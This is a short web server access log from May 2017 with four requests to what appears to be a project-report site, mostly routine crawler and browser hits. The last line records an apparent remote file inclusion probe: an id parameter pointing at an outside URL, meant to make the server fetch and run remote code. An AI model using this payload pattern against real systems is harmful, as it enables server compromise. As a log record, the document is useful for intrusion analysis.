40.77.167.135 - - [30/May/2017:06:59:44 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:07:02:27 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.58.98 - - [30/May/2017:07:02:40 +0530] "GET /project_details_view_report.php?id=695 HTTP/1.1" 200 13127 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
181.223.156.233 - - [30/May/2017:07:03:35 +0530] "GET /project_details_view.php?id=http://www.acacios.cl/made.jpg? HTTP/1.1" 200 11450 "-" "Mozilla/3.0 (compatible; Indy Library)"
